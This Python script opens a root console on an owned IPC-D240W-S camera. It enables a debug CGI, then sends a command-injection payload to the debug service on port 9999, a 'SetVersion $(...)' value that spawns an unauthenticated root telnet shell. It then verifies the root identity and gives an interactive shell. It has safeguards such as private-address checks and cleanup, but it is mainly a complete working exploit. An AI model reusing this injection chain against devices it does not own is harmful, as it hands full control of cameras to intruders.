#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""Open an interactive root console on the owner's old IPC-D240W-S.

Uses the previously confirmed F22 -> F23 sequence on V3.5.2.1. The camera
account password is entered on the local terminal and is never logged or
passed on the command line. Run only on the isolated, expendable old camera.

  python3 scripts/camera-root-console.py open --host HOST --user USER
  python3 scripts/camera-root-console.py connect --host HOST
  python3 scripts/camera-root-console.py close --host HOST --user USER

Press Ctrl-] to leave the interactive console. `open` cleans up automatically
on exit unless --keep-open is given; use `close` after a kept-open session.
"""

from __future__ import annotations

import argparse
import getpass
import ipaddress
import os
import re
import select
import socket
import sys
import termios
import time
import tty
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


DEBUG_PORT = 9999
TELNET_PORT = 23
IAC = 255


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, fp, code, msg, headers, newurl):
        return None


def toggle_debug(host: str, user: str, password: str, enable: bool) -> None:
    query = urllib.parse.urlencode({
        "enable": "1" if enable else "0",
        "username": user,
        "password": password,
    })
    url = f"http://{host}/cgi-bin/console.cgi?{query}"
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirect())
    try:
        with opener.open(urllib.request.Request(url, method="GET"), timeout=8) as response:
            status, body = response.status, response.read(4096)
    except urllib.error.HTTPError as exc:
        status, body = exc.code, exc.read(4096)
    try:
        reason = ET.fromstring(body).tag
    except ET.ParseError:
        reason = "unrecognized response"
    if status != 200 or reason != "ok":
        raise RuntimeError(f"debug toggle rejected (HTTP {status}, {reason})")


def wait_port(host: str, port: int, seconds: float = 6.0) -> bool:
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.8):
                return True
        except OSError:
            time.sleep(0.25)
    return False


def debug_command(host: str, command: str) -> str:
    if not command.isascii() or "\n" in command or "\r" in command:
        raise ValueError("invalid debug command")
    with socket.create_connection((host, DEBUG_PORT), timeout=4) as sock:
        sock.settimeout(4)
        sock.sendall(command.encode("ascii") + b"\n")
        data = bytearray()
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline and len(data) < 8192:
            try:
                chunk = sock.recv(2048)
            except socket.timeout:
                break
            if not chunk:
                break
            data.extend(chunk)
            if re.search(rb"return=0x[0-9a-fA-F]{8}", data):
                break
    return data.decode("ascii", "replace")


def strip_telnet(data: bytes, sock: socket.socket) -> bytes:
    """Remove Telnet control bytes and decline option negotiation."""
    result = bytearray()
    index = 0
    while index < len(data):
        if data[index] != IAC:
            result.append(data[index])
            index += 1
            continue
        if index + 1 >= len(data):
            break
        verb = data[index + 1]
        if verb == IAC:
            result.append(IAC)
            index += 2
        elif verb in (251, 252, 253, 254) and index + 2 < len(data):
            option = data[index + 2]
            if verb == 253:  # DO -> WONT
                sock.sendall(bytes((IAC, 252, option)))
            elif verb == 251:  # WILL -> DO for echo/SGA, DONT otherwise
                sock.sendall(bytes((IAC, 253 if option in (1, 3) else 254, option)))
            index += 3
        else:
            index += 2
    return bytes(result)


def read_until(sock: socket.socket, markers: tuple[bytes, ...], seconds: float) -> bytes:
    deadline = time.monotonic() + seconds
    data = bytearray()
    while time.monotonic() < deadline and len(data) < 32768:
        sock.settimeout(max(0.1, deadline - time.monotonic()))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data.extend(strip_telnet(chunk, sock))
        if any(marker in data for marker in markers):
            break
    return bytes(data)


def verified_shell(host: str) -> tuple[socket.socket, bytes]:
    sock = socket.create_connection((host, TELNET_PORT), timeout=4)
    try:
        greeting = read_until(sock, (b"# ", b"login: "), 6)
        if b"# " not in greeting or b"login: " in greeting:
            raise RuntimeError("port 23 did not present the root shell")
        sock.sendall(b"cat /proc/self/status\r\n")
        identity = read_until(sock, (b"# ",), 5)
        if not re.search(rb"(?m)^Uid:\s+0\s+0\s+0\s+0\s*$", identity):
            raise RuntimeError("root identity check failed")
        return sock, identity
    except Exception:
        sock.close()
        raise


def interactive(sock: socket.socket) -> None:
    if not sys.stdin.isatty():
        raise RuntimeError("an interactive terminal is required")
    fd = sys.stdin.fileno()
    previous = termios.tcgetattr(fd)
    print("Root identity verified. Ctrl-] disconnects. Keep flash writes out of this session until images are validated.")
    try:
        tty.setraw(fd)
        sock.setblocking(False)
        sock.sendall(b"\r\n")  # The identity check consumed the camera's first prompt.
        while True:
            readable, _, _ = select.select((fd, sock), (), ())
            if fd in readable:
                incoming = os.read(fd, 4096)
                if not incoming or b"\x1d" in incoming:
                    break
                sock.sendall(incoming.replace(b"\r", b"\r\n"))
            if sock in readable:
                incoming = sock.recv(4096)
                if not incoming:
                    break
                os.write(sys.stdout.fileno(), strip_telnet(incoming, sock))
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, previous)
        print("\nConsole disconnected.")


def cleanup(host: str, user: str, password: str) -> None:
    try:
        sock, _ = verified_shell(host)
    except (OSError, RuntimeError):
        sock = None
    if sock is not None:
        try:
            for command in (b"rm -f /tmp/flag.open.slog.tcp\r\n",
                            b"killall dbg_server\r\n", b"killall telnetd\r\n"):
                sock.sendall(command)
                time.sleep(0.25)
        except OSError:
            pass  # The final command closes its own Telnet connection.
        finally:
            sock.close()
    try:
        toggle_debug(host, user, password, False)
    except (OSError, RuntimeError) as exc:
        print(f"Debug disable could not be confirmed: {exc}", file=sys.stderr)
    if wait_port(host, DEBUG_PORT, 1) or wait_port(host, TELNET_PORT, 1):
        print("WARNING: port 23 or 9999 is still reachable; inspect the camera before leaving it online.", file=sys.stderr)
    else:
        print("Debug and Telnet listeners are not reachable from this host.")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("action", choices=("open", "connect", "close"))
    parser.add_argument("--host", default=os.environ.get("CAM_HOST"), required="CAM_HOST" not in os.environ,
                        help="camera IPv4 address (default: $CAM_HOST)")
    parser.add_argument("--user", help="camera web account (required for open/close)")
    parser.add_argument("--keep-open", action="store_true", help="leave service active after Ctrl-] (open only)")
    args = parser.parse_args()
    host = ipaddress.ip_address(args.host)
    if host.version != 4 or not host.is_private:
        parser.error("host must be a private IPv4 address")
    if args.action in ("open", "close") and not args.user:
        parser.error("--user is required for open/close")
    if args.keep_open and args.action != "open":
        parser.error("--keep-open is valid only with open")
    password = getpass.getpass("Camera web password (hidden): ") if args.user else None

    if args.action == "close":
        cleanup(str(host), args.user, password)
        return 0
    if args.action == "connect":
        with_socket, _ = verified_shell(str(host))
        try:
            interactive(with_socket)
        finally:
            with_socket.close()
        return 0

    enabled = False
    opened = False
    try:
        toggle_debug(str(host), args.user, password, True)
        enabled = True
        if not wait_port(str(host), DEBUG_PORT):
            raise RuntimeError("debug CGI succeeded but TCP 9999 is unreachable; check the VLAN firewall rule")
        if "return=0x00000000" not in debug_command(str(host), "telnet"):
            raise RuntimeError("debug telnet command was not accepted")
        if not wait_port(str(host), TELNET_PORT):
            raise RuntimeError("TCP 23 is unreachable; check the VLAN firewall rule")
        payload = "SetVersion $(killall telnetd&&telnetd -l /bin/sh -p 23)"
        if "return=0x00000000" not in debug_command(str(host), payload):
            raise RuntimeError("root-shell switch was not confirmed by debug service")
        if not wait_port(str(host), TELNET_PORT):
            raise RuntimeError("root Telnet listener did not reopen")
        sock, _ = verified_shell(str(host))
        opened = True
        try:
            interactive(sock)
        finally:
            sock.close()
        return 0
    finally:
        if enabled and (not args.keep_open or not opened):
            cleanup(str(host), args.user, password)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError, ValueError) as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        raise SystemExit(1)
